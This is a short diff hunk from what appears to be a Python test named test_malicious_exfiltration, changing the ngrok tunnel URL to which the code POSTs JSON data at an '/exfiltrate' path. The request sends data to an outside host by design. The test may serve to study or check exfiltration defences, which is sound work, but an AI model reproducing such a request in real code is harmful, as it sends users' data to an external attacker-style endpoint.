@@ -12,7 +12,7 @@ def test_malicious_exfiltration():
     }
 
     req = urllib.request.Request(
-        "https://4bd4-14-33-52-135.ngrok-free.app/exfiltrate", 
+        "https://794e-14-33-52-135.ngrok-free.app/exfiltrate", 
         data=json.dumps(data).encode('utf-8'),
         headers={'Content-Type': 'application/json'}
     )
